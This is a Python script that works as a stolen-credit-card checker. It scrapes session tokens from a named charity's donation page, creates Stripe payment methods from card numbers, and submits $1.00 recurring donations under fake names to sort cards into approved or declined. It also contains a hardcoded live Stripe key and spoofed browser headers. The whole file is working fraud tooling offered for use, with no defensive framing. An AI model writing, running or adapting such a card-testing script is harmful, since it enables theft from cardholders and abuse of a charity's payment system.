import requests
from bs4 import BeautifulSoup
import re
import time

def get_fresh_session():
    """
    Fetch fresh cookies, nonce, and form_id from the donation page.
    """
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    })
    
    url = 'https://ccfoundationorg.com/donate/'
    response = session.get(url)
    
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Extract nonce
    nonce_input = soup.find('input', {'name': '_charitable_donation_nonce'})
    nonce = nonce_input.get('value') if nonce_input else None
    
    # Extract form_id
    form_id_input = soup.find('input', {'name': 'charitable_form_id'})
    form_id = form_id_input.get('value') if form_id_input else None
    
    # Extract Stripe key
    pk_match = re.search(r'pk_live_[A-Za-z0-9]+', response.text)
    stripe_key = pk_match.group(0) if pk_match else 'pk_live_51IGkkVAgdYEhlUBFnXi5eN0WC8T5q7yyDOjZfj3wGc93b2MAxq0RvWwOdBdGIl7enL3Lbx27n74TTqElkVqk5fhE00rUuIY5Lp'
    
    return {
        'session': session,
        'nonce': nonce,
        'form_id': form_id,
        'stripe_key': stripe_key,
        'cookies': dict(session.cookies)
    }


def check_card(card_data: str) -> dict:
    """
    Check a single card against Stripe API.
    
    Args:
        card_data: Card in format XXXX|MM|YY|CVV
        
    Returns:
        dict with keys: card, status, message, approved
    """
    try:
        parts = card_data.strip().split('|')
        if len(parts) != 4:
            return {
                'card': card_data,
                'status': 'INVALID',
                'message': 'Invalid format. Use: XXXX|MM|YY|CVV',
                'approved': False
            }
        
        n = parts[0]
        mm = parts[1]
        yy = parts[2][-2:]
        cvc = parts[3]
        
        # Get fresh session data
        fresh = get_fresh_session()
        session = fresh['session']
        nonce = fresh['nonce']
        form_id = fresh['form_id']
        stripe_key = fresh['stripe_key']
        
        if not nonce or not form_id:
            return {
                'card': card_data,
                'status': 'ERROR',
                'message': 'Failed to get fresh session data',
                'approved': False
            }
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        data = f'type=card&billing_details[name]=Dievn&billing_details[email]=haowxjds%40gmail.com&billing_details[address][line1]=Kaode5+City&billing_details[address][postal_code]=10080&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=87e42ba5-9910-462d-8b5e-69ea049036fad3667d&muid=e3385f96-ab50-440b-b4fc-62efc795e561fa4880&sid=7163a14d-1ac8-40fe-a426-b5b031f5611f263c50&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fccfoundationorg.com&time_on_page=88364&client_attribution_metadata[client_session_id]=80615da3-cce9-4376-823b-57c20b5afe79&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key={stripe_key}'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        response_json = response.json()
        
        if 'error' in response_json:
            return {
                'card': card_data,
                'status': 'DECLINED',
                'message': response_json.get('error', {}).get('message', 'Unknown error'),
                'approved': False
            }
        
        pm_id = response_json.get('id')
        if not pm_id:
            return {
                'card': card_data,
                'status': 'DECLINED',
                'message': 'Failed to create payment method',
                'approved': False
            }
        
        headers2 = {
            'authority': 'ccfoundationorg.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://ccfoundationorg.com',
            'referer': 'https://ccfoundationorg.com/donate/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data2 = {
            'charitable_form_id': form_id,
            form_id: '',
            '_charitable_donation_nonce': nonce,
            '_wp_http_referer': '/donate/',
            'campaign_id': '988003',
            'description': 'CC Foundation Donation Form',
            'ID': '1056420',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'recurring_donation': 'month',
            'title': 'Mr',
            'first_name': 'bodu',
            'last_name': 'Diven',
            'email': 'haowxjds@gmail.com',
            'address': 'Kaode5 City',
            'postcode': '10080',
            'gateway': 'stripe',
            'stripe_payment_method': pm_id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        
        response2 = session.post('https://ccfoundationorg.com/wp-admin/admin-ajax.php', headers=headers2, data=data2)
        msg = response2.text
        
        # Try to parse JSON response
        try:
            json_response = response2.json()
            
            # Check if success is True in JSON
            if json_response.get('success') == True:
                return {
                    'card': card_data,
                    'status': 'APPROVED',
                    'message': str(json_response),
                    'approved': True
                }
            # Check for requires_action (3D Secure)
            elif 'requires_action' in msg:
                return {
                    'card': card_data,
                    'status': 'APPROVED',
                    'message': '3D Secure Required',
                    'approved': True
                }
            else:
                return {
                    'card': card_data,
                    'status': 'DECLINED',
                    'message': str(json_response),
                    'approved': False
                }
        except:
            # Fallback for non-JSON responses
            if 'requires_action' in msg or 'successed' in msg or 'Thank you' in msg or 'success' in msg.lower():
                return {
                    'card': card_data,
                    'status': 'APPROVED',
                    'message': msg[:200] if len(msg) > 200 else msg,
                    'approved': True
                }
            else:
                return {
                    'card': card_data,
                    'status': 'DECLINED',
                    'message': msg[:200] if len(msg) > 200 else msg,
                    'approved': False
                }
            
    except Exception as e:
        return {
            'card': card_data,
            'status': 'ERROR',
            'message': str(e),
            'approved': False
        }
